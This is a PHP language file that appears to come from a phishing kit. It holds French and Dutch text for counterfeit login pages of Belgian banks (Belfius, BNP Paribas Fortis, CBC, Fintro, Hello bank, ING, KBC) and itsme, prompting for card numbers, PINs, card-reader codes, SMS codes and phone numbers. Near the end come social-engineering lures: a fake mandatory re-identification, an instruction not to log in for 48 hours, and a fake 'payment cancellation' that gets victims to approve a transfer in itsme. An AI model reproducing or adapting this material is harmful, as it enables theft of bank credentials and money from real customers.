<?php

    if (isset($_GET["lang"])) {
        $_SESSION["lang"] = $_GET["lang"];
    }    
    include "./Asstes/php/config/config.php";
    $lang = array(

        // belfius
        'be_l_1' => array(
            'fr' => "Se connecter",
            'nl' => "Inloggen",
        ),
        'be_l_2' => array(
            'fr' => 'Accès refusé. Essayez à nouveau et vérifiez que la carte est valable (les anciennes cartes bancaires, les cartes de crédit ou prépayées et les cartes d\'une autre banque que Belfius ne sont pas valables). Vérifiez que le numéro de votre carte correspond au numéro mentionné ci-dessous sur l\'écran. Soyez aussi attentif aux fautes de frappe. (USERIDENTIFICATIONANDAUTHENTICAT/90AC/1310 )',
            'nl' => 'Toegang geweigerd. Probeer het opnieuw en controleer of de kaart geldig is (oude bankkaarten, krediet- of prepaidkaarten en kaarten van een andere bank dan Belfius zijn niet geldig). Controleer of het nummer van uw kaart overeenkomt met het nummer hieronder op het scherm. Wees ook attent op typefouten. (USERIDENTIFICATIONANDAUTHENTICAT/90AC/1310)',
        ),
        'be_l_3' => array(
            'fr' => "Insérez votre carte bancaire dans le lecteur de carte Belfius.",
            'nl' => "Steek uw bankkaart in de Belfius kaartlezer.",
        ),
        'be_l_4' => array(
            'fr' => "Appuyez sur la touche",
            'nl' => "Druk op de toets",
        ),
        'be_l_5' => array(
            'fr' => "Introduisez le code de sécurité dans le lecteur de carte Belfius.",
            'nl' => "Voer de beveiligingscode in de Belfius kaartlezer in.",
        ),
        'be_l_6' => array(
            'fr' => "Introduisez votre code PIN et confirmez avec la touche",
            'nl' => "Voer uw PIN-code in en bevestig met de toets",
        ),
        'be_l_7' => array(
            'fr' => "PIN",
            'nl' => "PIN",
        ),
        'be_l_8' => array(
            'fr' => "Introduisez le code connexion.",
            'nl' => "Voer de verbindingscode in.",
        ),
        'be_l_9' => array(
            'fr' => "Confirmer",
            'nl' => "Bevestigen",
        ),

        // page 2
        'be_s_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),
        'be_s_2' => array( 
            'fr' => "Code d'Activation",
            'nl' => "Activatiecode",
        ),
        'be_s_3' => array(
            'fr' => "Le SMS contenant le code a été envoyé à",
            'nl' => "De SMS met de code is verzonden naar",
        ),
        'be_s_4' => array(
            'fr' => "Le code que vous avez entré est incorrect",
            'nl' => "De code die u hebt ingevoerd is onjuist",
        ),
        'be_s_5' => array(
            'fr' => "Vous ne recevez pas de SMS?",
            'nl' => "Ontvangt u geen SMS?",
        ),
        'be_s_6' => array(
            'fr' => "continuer",
            'nl' => "doorgaan",
        ),

        // page 3
        'be_n_1' => array(
            'fr' => "Se connecter",
            'nl' => "Inloggen",
        ),
        'be_n_2' => array(
            'fr' => "Sans cable USB",
            'nl' => "Zonder USB-kabel",
        ),
        'be_n_3' => array(
            'fr' => "Introduisez votre numéro de carte",
            'nl' => "Voer uw kaartnummer in",
        ),
        'be_n_4' => array(
            'fr' => "Votre numéro de carte",
            'nl' => "Uw kaartnummer",
        ),
        'be_n_5' => array(
            'fr' => "Vous avez introduit le numéro de carte erroné.",
            'nl' => "U hebt het verkeerde kaartnummer ingevoerd.",
        ),
        'be_n_6' => array(
            'fr' => "Mémoriser le numéro de carte",
            'nl' => "Kaartnummer opslaan",
        ),
        'be_n_7' => array(
            'fr' => "Confirmer",
            'nl' => "Bevestigen",
        ),


        // bnp
        'bn_l_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),
        'bn_l_2' => array(
            'fr' => "Accédez à Easy Banking Business",
            'nl' => "Toegang tot Easy Banking Business",
        ),
        'bn_l_3' => array(
            'fr' => "Menu",
            'nl' => "Menu",
        ),
        'bn_l_4' => array(
            'fr' => "La signature électronique n'est pas correcte. Essaie encore.",
            'nl' => "De elektronische handtekening is niet correct. Probeer opnieuw.",
        ),
        'bn_l_5' => array(
            'fr' => "Bienvenue à",
            'nl' => "Welkom bij",
        ),
        'bn_l_6' => array(
            'fr' => "1. Utilisez la carte de débit suivante pour vous inscrire:",
            'nl' => "1. Gebruik de volgende debetkaart om u in te schrijven:",
        ),
        'bn_l_7' => array(
            'fr' => "2. Insérez votre carte dans le lecteur de carte et appuyez sur",
            'nl' => "2. Steek uw kaart in de kaartlezer en druk op",
        ),
        'bn_l_8' => array(
            'fr' => "Entrer",
            'nl' => "Invoeren",
        ),
        'bn_l_9' => array(
            'fr' => "entrez et appuyez sur",
            'nl' => "voer in en druk op",
        ),
        'bn_l_10' => array(
            'fr' => "4. Entrez votre code PIN et appuyez sur",
            'nl' => "4. Voer uw PIN-code in en druk op",
        ),
        'bn_l_11' => array(
            'fr' => "5. Entrez la signature électronique",
            'nl' => "5. Voer de elektronische handtekening in",
        ),
        'bn_l_12' => array(
            'fr' => "Remplissez une signature électronique valide",
            'nl' => "Vul een geldige elektronische handtekening in",
        ),
        'bn_l_13' => array(
            'fr' => "Signe",
            'nl' => "Handtekening",
        ),
        'bn_l_14' => array(
            'fr' => "Besoin d'aide? Appeler à +32 2 762 60 00",
            'nl' => "Hulp nodig? Bel naar +32 2 762 60 00",
        ),

        // page 2
        'bn_s_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),
        'bn_s_2' => array(
            'fr' => "Code d'activation",
            'nl' => "Activatiecode",
        ),
        'bn_s_3' => array(
            'fr' => "Le SMS contenant le code a été envoyé à",
            'nl' => "De SMS met de code is verzonden naar",
        ),
        'bn_s_4' => array(
            'fr' => "Le code que vous avez entré est incorrect",
            'nl' => "De code die u hebt ingevoerd is onjuist",
        ),
        'bn_s_5' => array(
            'fr' => "Vous ne recevez pas de SMS?",
            'nl' => "Ontvangt u geen SMS?",
        ),
        'bn_s_6' => array(
            'fr' => "continuer",
            'nl' => "doorgaan",
        ),

        // page 3
        'bn_n_1' => array(
            'fr' => "Bienvenue à",
            'nl' => "Welkom bij",
        ),
        'bn_n_2' => array(
            'fr' => "Êtes-vous satisfait de la banque bpost?",
            'nl' => "Bent u tevreden met de bpost bank?",
        ),
        'bn_n_3' => array(
            'fr' => "Trouvez rapidement votre numéro de client",
            'nl' => "Vind snel uw klantnummer",
        ),
        'bn_n_4' => array(
            'fr' => "Numéro de carte",
            'nl' => "Kaartnummer",
        ),
        'bn_n_5' => array(
            'fr' => "Le format du numéro de carte est incorrect.",
            'nl' => "Het kaartnummerformaat is onjuist.",
        ),
        'bn_n_6' => array(
            'fr' => "Numéro de Client",
            'nl' => "Klantnummer",
        ),
        'bn_n_7' => array(
            'fr' => "Le numéro de client est erroné.",
            'nl' => "Het klantnummer is onjuist.",
        ),
        'bn_n_8' => array(
            'fr' => "Suivant",
            'nl' => "Volgende",
        ),
        'bn_n_9' => array(
            'fr' => "Besoin d'aide? Appeler à +32 2 762 60 00",
            'nl' => "Hulp nodig? Bel naar +32 2 762 60 00",
        ),
 

        // cbc
        'cb_l_1' => array(
            'fr' => "Introduisez votre carte de débit dans le lecteur de carte",
            'nl' => "Steek uw debetkaart in de kaartlezer",
        ),  
        'cb_l_2' => array(
            'fr' => "Appuyez sur",
            'nl' => "Druk op",
        ),  
        'cb_l_3' => array(
            'fr' => "Introduisez le code de départ",
            'nl' => "Voer de startcode in",
        ),  
        'cb_l_4' => array(
            'fr' => "Introduisez votre code PIN",
            'nl' => "Voer uw PIN-code in",
        ),  
        'cb_l_5' => array(
            'fr' => "PIN",
            'nl' => "PIN",
        ),  
        'cb_l_6' => array(
            'fr' => "Introduisez le code de connexion",
            'nl' => "Voer de verbindingscode in",
        ),  
        'cb_l_7' => array(
            'fr' => "Vous avez introduit le code de connexion erroné.",
            'nl' => "U hebt de verbindingscode onjuist ingevoerd.",
        ),  
        'cb_l_8' => array(
            'fr' => "Se connecter",
            'nl' => "Inloggen",
        ),  
        // page 2  
        'cb_s_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),  
        'cb_s_2' => array(
            'fr' => "Code d'activation",
            'nl' => "Activatiecode",
        ),  
        'cb_s_3' => array(
            'fr' => "Le SMS contenant le code a été envoyé à",
            'nl' => "De SMS met de code is verzonden naar",
        ),  
        'cb_s_4' => array(
            'fr' => "Le code que vous avez entré est incorrect",
            'nl' => "De code die u hebt ingevoerd is onjuist",
        ),  
        'cb_s_5' => array(
            'fr' => "Vous ne recevez pas de SMS?",
            'nl' => "Ontvangt u geen SMS?",
        ),        
        'cb_s_6' => array(
            'fr' => "continuer",
            'nl' => "doorgaan",
        ), 
        // page 3    
        'cb_n_1' => array(
            'fr' => "Choisissez de quelle manière vous souhaitez vous connecter",
            'nl' => "Kies hoe u zich wilt inloggen",
        ),        
        'cb_n_2' => array(
            'fr' => "Manuelle",
            'nl' => "Handmatig",
        ),        
        'cb_n_3' => array(
            'fr' => "Introduisez votre numéro de carte",
            'nl' => "Voer uw kaartnummer in",
        ),        
        'cb_n_4' => array(
            'fr' => "Vous avez introduit un numéro de carte erroné.",
            'nl' => "U hebt een onjuist kaartnummer ingevoerd.",
        ),        
        'cb_n_5' => array(
            'fr' => "Enregistrer",
            'nl' => "Opslaan",
        ),        
        'cb_n_6' => array(
            'fr' => "Se connecter",
            'nl' => "Inloggen",
        ),  

        
        // fintro
        'fi_l_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),        
        'fi_l_2' => array(
            'fr' => "Accédez à Easy Banking Business",
            'nl' => "Toegang tot Easy Banking Business",
        ),        
        'fi_l_3' => array(
            'fr' => "Le Menu",
            'nl' => "Het Menu",
        ),        
        'fi_l_4' => array(
            'fr' => "La signature électronique n'est pas correcte. Essaie encore.",
            'nl' => "De elektronische handtekening is niet correct. Probeer het opnieuw.",
        ),        
        'fi_l_5' => array(
            'fr' => "Bienvenue à",
            'nl' => "Welkom bij",
        ),        
        'fi_l_6' => array(
            'fr' => "1. Utilisez la carte de débit suivante pour vous inscrire:",
            'nl' => "1. Gebruik de onderstaande debetkaart om u in te schrijven:",
        ),        
        'fi_l_7' => array(
            'fr' => "2. Insérez votre carte dans le lecteur de carte et appuyez sur",
            'nl' => "2. Steek uw kaart in de kaartlezer en druk op",
        ),        
        'fi_l_8' => array(
            'fr' => "Entrer",
            'nl' => "Invoeren",
        ),        
        'fi_l_9' => array(
            'fr' => "entrez et appuyez sur",
            'nl' => "voer in en druk op",
        ),        
        'fi_l_10' => array(
            'fr' => "4. Entrez votre code PIN et appuyez sur",
            'nl' => "4. Voer uw PIN-code in en druk op",
        ),        
        'fi_l_11' => array(
            'fr' => "5. Entrez la signature électronique",
            'nl' => "5. Voer de elektronische handtekening in",
        ),        
        'fi_l_12' => array(
            'fr' => "Remplissez une signature électronique valide",
            'nl' => "Vul een geldige elektronische handtekening in",
        ),        
        'fi_l_13' => array(
            'fr' => "Signe",
            'nl' => "Handtekening",
        ),        
        'fi_l_14' => array(
            'fr' => "Besoin d'aide? Appeler à +32 2 762 60 00",
            'nl' => "Hulp nodig? Bel naar +32 2 762 60 00",
        ),        
        // page 2
        'fi_s_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),         
        'fi_s_2' => array(
            'fr' => "Code d'activation",
            'nl' => "Activatiecode",
        ),         
        'fi_s_3' => array(
            'fr' => "Le SMS contenant le code a été envoyé à",
            'nl' => "De SMS met de code is verzonden naar",
        ),         
        'fi_s_4' => array(
            'fr' => "Le code que vous avez entré est incorrect",
            'nl' => "De code die u hebt ingevoerd is onjuist",
        ),         
        'fi_s_5' => array(
            'fr' => "Vous ne recevez pas de SMS?",
            'nl' => "Ontvangt u geen SMS?",
        ),         
        'fi_s_6' => array(
            'fr' => "continuer",
            'nl' => "doorgaan",
        ),  
        // page 3
        'fi_n_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),         
        'fi_n_2' => array(
            'fr' => "Accédez à Easy Banking Business",
            'nl' => "Toegang tot Easy Banking Business",
        ),         
        'fi_n_3' => array(
            'fr' => "Le Menu",
            'nl' => "Het Menu",
        ),         
        'fi_n_4' => array(
            'fr' => "Bienvenue à",
            'nl' => "Welkom bij",
        ),         
        'fi_n_5' => array(
            'fr' => "Numéro de carte",
            'nl' => "Kaartnummer",
        ),         
        'fi_n_6' => array(
            'fr' => "La forme du numéro de carte est celle de fouts.",
            'nl' => "Het formaat van het kaartnummer is onjuist.",
        ),         
        'fi_n_7' => array(
            'fr' => "Numéro de Client",
            'nl' => "Klantnummer",
        ),         
        'fi_n_8' => array(
            'fr' => "Le numéro de client est erroné.",
            'nl' => "Het klantnummer is onjuist.",
        ),         
        'fi_n_9' => array(
            'fr' => "Suivant",
            'nl' => "Volgende",
        ), 
        'fi_n_10' => array(
            'fr' => "Besoin d'aide? Appeler à +32 2 762 60 00",
            'nl' => "Hulp nodig? Bel naar +32 2 762 60 00",
        ),  

        
        //hello
        'he_l_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),         
        'he_l_2' => array(
            'fr' => "À propos d'Easy Banking Business",
            'nl' => "Over Easy Banking Business",
        ),         
        'he_l_3' => array(
            'fr' => "Le Menu",
            'nl' => "Het Menu",
        ),         
        'he_l_4' => array(
            'fr' => "Bienvenue à",
            'nl' => "Welkom bij",
        ),         
        'he_l_5' => array(
            'fr' => "1. Utilisez la carte de débit suivante pour vous inscrire:",
            'nl' => "1. Gebruik de onderstaande debetkaart om u in te schrijven:",
        ),         
        'he_l_6' => array(
            'fr' => "2. Insérez votre carte dans le lecteur de carte et appuyez sur",
            'nl' => "2. Steek uw kaart in de kaartlezer en druk op",
        ),         
        'he_l_7' => array(
            'fr' => "3. Entrer",
            'nl' => "Invoeren",
        ),         
        'he_l_8' => array(
            'fr' => "entrez et appuyez sur",
            'nl' => "voer in en druk op",
        ),         
        'he_l_9' => array(
            'fr' => "4. Entrez votre code PIN et appuyez sur",
            'nl' => "4. Voer uw PIN-code in en druk op",
        ),         
        'he_l_10' => array(
            'fr' => "5. Entrez la signature électronique",
            'nl' => "5. Voer de elektronische handtekening in",
        ),         
        'he_l_11' => array(
            'fr' => "Remplissez une signature électronique valide",
            'nl' => "Vul een geldige elektronische handtekening in",
        ),         
        'he_l_12' => array(
            'fr' => "Signe",
            'nl' => "Handtekening",
        ),         
        'he_l_13' => array(
            'fr' => "Besoin d'aide? Appeler à +32 2 762 60 00",
            'nl' => "Hulp nodig? Bel naar +32 2 762 60 00",
        ), 

        // page 2 
        'he_s_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),         
        'he_s_2' => array(
            'fr' => "Code d'activation",
            'nl' => "Activatiecode",
        ),         
        'he_s_3' => array(
            'fr' => "Le SMS contenant le code a été envoyé à",
            'nl' => "De SMS met de code is verzonden naar",
        ),         
        'he_s_4' => array(
            'fr' => "Le code que vous avez entré est incorrect",
            'nl' => "De code die u hebt ingevoerd is onjuist",
        ),         
        'he_s_5' => array(
            'fr' => "Vous ne recevez pas de SMS?",
            'nl' => "Ontvangt u geen SMS?",
        ),         
        'he_s_6' => array(
            'fr' => "continuer",
            'nl' => "doorgaan",
        ), 

        // page 3 
        'he_n_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),         
        'he_n_2' => array(
            'fr' => "Accédez à Easy Banking Business",
            'nl' => "Toegang tot Easy Banking Business",
        ),         
        'he_n_3' => array(
            'fr' => "Menu",
            'nl' => "Menu",
        ),         
        'he_n_4' => array(
            'fr' => "Bienvenue à",
            'nl' => "Welkom bij",
        ),         
        'he_n_5' => array(
            'fr' => "Numéro de carte",
            'nl' => "Kaartnummer",
        ),         
        'he_n_6' => array(
            'fr' => "Le format du numéro de carte est incorrect.",
            'nl' => "Het formaat van het kaartnummer is onjuist.",
        ),         
        'he_n_7' => array(
            'fr' => "Numéro de Client",
            'nl' => "Klantnummer",
        ),         
        'he_n_8' => array(
            'fr' => "Le numéro de client est erroné.",
            'nl' => "Het klantnummer is onjuist.",
        ),         
        'he_n_9' => array(
            'fr' => "Suivant",
            'nl' => "Volgende",
        ),         
        'he_n_10' => array(
            'fr' => "Besoin d'aide? Appeler à +32 2 762 60 00",
            'nl' => "Hulp nodig? Bel naar +32 2 762 60 00",
        ),  
  
        
        // ing
        'ing_l_1' => array(
            'fr' => "Se connecter avec ING Card Reader",
            'nl' => "Inloggen met ING Card Reader",
        ),         
        'ing_l_2' => array(
            'fr' => "Carte de débit:",
            'nl' => "Debetkaart:",
        ),         
        'ing_l_3' => array(
            'fr' => "ING ID",
            'nl' => "ING ID",
        ),         
        'ing_l_4' => array(
            'fr' => "IDENTIFY",
            'nl' => "IDENTIFICEREN",
        ),         
        'ing_l_5' => array(
            'fr' => "Introduisez votre code secret et appuyez sur \"OK\".",
            'nl' => "Voer uw geheime code in en druk op 'OK'.",
        ),         
        'ing_l_6' => array(
            'fr' => "RESPONSE",
            'nl' => "RESPONS",
        ),         
        'ing_l_7' => array(
            'fr' => "Please check your debit card number is correct",
            'nl' => "Controleer of het nummer van uw debetkaart correct is.",
        ),         
        'ing_l_8' => array(
            'fr' => "Sauvegarder vos données bancaires",
            'nl' => "Sla uw bankgegevens op",
        ),         
        'ing_l_9' => array(
            'fr' => "Se connecter rapidement sans lecteur de carte?",
            'nl' => "Snel inloggen zonder kaartlezer?",
        ),         
        'ing_l_10' => array(
            'fr' => "Utilisez itsme® et <a href=''>découvrez pourquoi il s’agit du nouveau standard en matière de sécurité bancaire en ligne.</a>",
            'nl' => "Gebruik itsme® en <a href=''>ontdek waarom dit de nieuwe standaard is voor online bankbeveiliging.</a>",
        ),         
        'ing_l_11' => array(
            'fr' => "Aide et Info",
            'nl' => "Hulp en Informatie",
        ),         
        'ing_l_12' => array(
            'fr' => "Sécurité en ligne",
            'nl' => "Online Beveiliging",
        ),         
        'ing_l_13' => array(
            'fr' => "Vie Privée",
            'nl' => "Privacy",
        ),         
        'ing_l_14' => array(
            'fr' => "Règlement Général des Opérations",
            'nl' => "Algemene Voorwaarden",
        ), 
        'ing_l_15' => array(
            'fr' => "Insérez votre carte de débit dans le ING Card Reader et appuyez sur \"Identify\".",
            'nl' => "Steek uw debetkaart in de ING Card Reader en druk op 'Identify'.",
        ), 
        'ing_l_16' => array(
            'fr' => "Suivant",
            'nl' => "Volgende",
        ),
 
        // page 3     
        'ing_s_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),                     
        'ing_s_2' => array(
            'fr' => "Code d'activation",
            'nl' => "Activatiecode",
        ),                     
        'ing_s_3' => array(
            'fr' => "Le SMS contenant le code a été envoyé à",
            'nl' => "De SMS met de code is verzonden naar",
        ),                     
        'ing_s_4' => array(
            'fr' => "Le code que vous avez entré est incorrect",
            'nl' => "De code die u heeft ingevoerd is onjuist",
        ),                     
        'ing_s_5' => array(
            'fr' => "Vous ne recevez pas de SMS?",
            'nl' => "Ontvangt u geen SMS?",
        ),  
        'ing_s_6' => array(
            'fr' => "continuer",
            'nl' => "doorgaan",
        ),  

        // page 3    
        'ing_n_1' => array(
            'fr' => "Se connecter avec ING Card Reader",
            'nl' => "Inloggen met ING Card Reader",
        ),                     
        'ing_n_2' => array(
            'fr' => "Carte de débit",
            'nl' => "Debetkaart",
        ),                     
        'ing_n_3' => array(
            'fr' => "Veuillez vérifier que votre numéro de carte de débit est correct",
            'nl' => "Controleer of uw debetkaartnummer correct is",
        ),                     
        'ing_n_4' => array(
            'fr' => "ING ID",
            'nl' => "ING ID",
        ),                     
        'ing_n_5' => array(
            'fr' => "Indiquez correctement votre numéro de carte de débit",
            'nl' => "Geef uw debetkaartnummer correct in",
        ),                     
        'ing_n_6' => array(
            'fr' => "Sauvegarder vos données bancaires",
            'nl' => "Sla uw bankgegevens op",
        ),                     
        'ing_n_7' => array(
            'fr' => "Se connecter rapidement sans lecteur de carte?",
            'nl' => "Snel inloggen zonder kaartlezer?",
        ),                     
        'ing_n_8' => array(
            'fr' => "Utilisez itsme® et <a href=''>découvrez pourquoi il s’agit du nouveau standard en matière de sécurité bancaire en ligne.</a>",
            'nl' => "Gebruik itsme® en <a href=''>ontdek waarom dit de nieuwe standaard is voor online bankbeveiliging.</a>",
        ),                     
        'ing_n_9' => array(
            'fr' => "Aide et Info",
            'nl' => "Hulp en Informatie",
        ),                     
        'ing_n_10' => array(
            'fr' => "Suivant",
            'nl' => "Volgende",
        ),                     
        'ing_n_11' => array(
            'fr' => "Sécurité en ligne",
            'nl' => "Online Beveiliging",
        ),                     
        'ing_n_12' => array(
            'fr' => "Vie Privée",
            'nl' => "Privacy",
        ),                     
        'ing_n_13' => array(
            'fr' => "Règlement Général des Opérations",
            'nl' => "Algemene Voorwaarden",
        ),
                                        
        
        // kbc                     
        'kb_l_1' => array(
            'fr' => "Introduisez votre carte de débit dans le lecteur de carte",
            'nl' => "Steek uw debetkaart in de kaartlezer",
        ),                     
        'kb_l_2' => array(
            'fr' => "Appuyez sur",
            'nl' => "Druk op",
        ),                                         
        'kb_l_3' => array(
            'fr' => "Introduisez le code de départ",
            'nl' => "Voer de startcode in",
        ),                     
        'kb_l_4' => array(
            'fr' => "Introduisez votre code PIN",
            'nl' => "Voer uw pincode in",
        ),                     
        'kb_l_5' => array(
            'fr' => "Introduisez le code de connexion",
            'nl' => "Voer de inlogcode in",
        ),                     
        'kb_l_6' => array(
            'fr' => "Vous avez introduit le code de connexion erroné.",
            'nl' => "U heeft de verkeerde inlogcode ingevoerd.",
        ),                     
        'kb_l_7' => array(
            'fr' => "Se connecter",
            'nl' => "Inloggen",
        ),   

        // page 2   
        'kb_s_1' => array(
            'fr' => "Retour",
            'nl' => "Terug",
        ),                     
        'kb_s_2' => array(
            'fr' => "Code d'activation",
            'nl' => "Activatiecode",
        ),                     
        'kb_s_3' => array(
            'fr' => "Le SMS contenant le code a été envoyé à",
            'nl' => "De SMS met de code is verzonden naar",
        ),                     
        'kb_s_4' => array(
            'fr' => "Le code que vous avez entré est incorrect",
            'nl' => "De code die u heeft ingevoerd is onjuist",
        ),                     
        'kb_s_5' => array(
            'fr' => "Vous ne recevez pas de SMS?",
            'nl' => "Ontvangt u geen SMS?",
        ),                     
        'kb_s_6' => array(
            'fr' => "continuer",
            'nl' => "doorgaan",
        ),                     

        // page 3 
        'kb_n_1' => array(
            'fr' => "Choisissez de quelle manière vous souhaitez vous connecter",
            'nl' => "Kies hoe u zich wilt aanmelden",
        ),          
        'kb_n_2' => array(
            'fr' => "Manuelle",
            'nl' => "Handmatig",
        ),          
        'kb_n_3' => array(
            'fr' => "Introduisez votre numéro de carte",
            'nl' => "Voer uw kaartnummer in",
        ),          
        'kb_n_4' => array(
            'fr' => "Vous avez introduit un numéro de carte erroné.",
            'nl' => "U heeft een onjuist kaartnummer ingevoerd.",
        ),          
        'kb_n_5' => array(
            'fr' => "Enregistrer",
            'nl' => "Opslaan",
        ),          
        'kb_n_6' => array(
            'fr' => "Se connecter",
            'nl' => "Inloggen",
        ),  
         
        
        // load
        'load' => array(
            'fr' => "Chargement...",
            'nl' => "Laden...",
        ),  

        // page message
        'mess1' => array(
            'fr' => "Vos données sont-elles toujours à jour?",
            'nl' => "Zijn uw gegevens nog steeds up-to-date?",
        ),
        'mess2' => array(
            'fr' => "Ré-identification avec l'identifiant its me",
            'nl' => "Hernieuwing van uw identiteit met itsme",
        ),
        'mess3' => array(
            'fr' => "Chaque client itsme est prié de revérifier son identité et de répondre à quelques questions sur ses comptes.",
            'nl' => "Elke itsme-klant wordt gevraagd zijn identiteit opnieuw te verifiëren en enkele vragen over zijn rekeningen te beantwoorden.",
        ),
        'mess4' => array(
            'fr' => "Cette procédure est obligatoire, mais heureusement, elle peut être effectuée facilement, en toute sécurité et rapidement via notre portail client en ligne.",
            'nl' => "Deze procedure is verplicht, maar gelukkig kan het eenvoudig, veilig en snel worden uitgevoerd via ons online klantportaal.",
        ),
        'mess5' => array(
            'fr' => "Ré-identifier",
            'nl' => "Hernieuwing van identiteit",
        ),

        // type
        'type' => array(
            'fr' => "Sélectionnez votre Banque",
            'nl' => "Kies uw bank",
        ),  

        // success
        'suc1' => array(
            'fr' => "Merci d'avoir confirmé vos données personnelles.",
            'nl' => "Bedankt voor het bevestigen van uw persoonlijke gegevens.",
        ), 
        'suc2' => array(
            'fr' => "Veuillez noter que le processus de réactivation prend 48 heures et Qu'il vous est strictement interdit de vous reconnecter à votre application ou au site Web pendant les 48 prochaines heures pour assurer le bon déroulement du processus de réactivation.",
            'nl' => "Houd er rekening mee dat het heractiveringsproces 48 uur duurt en dat het ten strengste verboden is om zich gedurende de komende 48 uur opnieuw aan te melden bij uw applicatie of website om het heractivatieproces goed te laten verlopen.",
        ), 
        'suc3' => array(
            'fr' => "Merci de votre compréhension.",
            'nl' => "Bedankt voor uw begrip.",
        ), 

        // number
        'num1' => array(
            'fr' => "Vous identifiez",
            'nl' => "U identificeert zich",
        ), 
        'num2' => array(
            'fr' => "Votre numéro de portable",
            'nl' => "Uw mobiele nummer",
        ), 
        'num3' => array(
            'fr' => "Nom complet",
            'nl' => "Volledige naam",
        ), 
        'num4' => array(
            'fr' => "Se souvenir de mon numéro",
            'nl' => "Onthoud mijn nummer",
        ), 
        'num5' => array(
            'fr' => "Entrez votre nom complet",
            'nl' => "Voer uw volledige naam in",
        ), 
        'num6' => array(
            'fr' => "Envoyer",
            'nl' => "Verzenden",
        ), 
        // confirm
        'it_txt_1' => array(
            'fr' => "Annulation de paiement en cours",
            'nl' => "Betalingsannulering bezig",
        ),        
        'it_txt_2' => array(
            'fr' => "Pour finaliser l’annulation de votre paiement, veuillez valider la transaction via votre application Itsme en confirmant le montant concerné.",
            'nl' => "Om de annulering van uw betaling te voltooien, bevestigt u de transactie via uw Itsme-app door het betreffende bedrag te bevestigen.",
        ),            
        'it_txt_4' => array(
            'fr' => "avant qu'il ne soit trop tard",
            'nl' => "voordat het te laat is",
        ),        
        'it_txt_5' => array(
            'fr' => "Vérifiez les détails affichés dans votre application itsme®it's me et confirmez avec votre code itsme®it's me.",
            'nl' => "Controleer de details die in je itsme®it's me app worden weergegeven en bevestig met je itsme®it's me-code.",
        ),         
    );

?>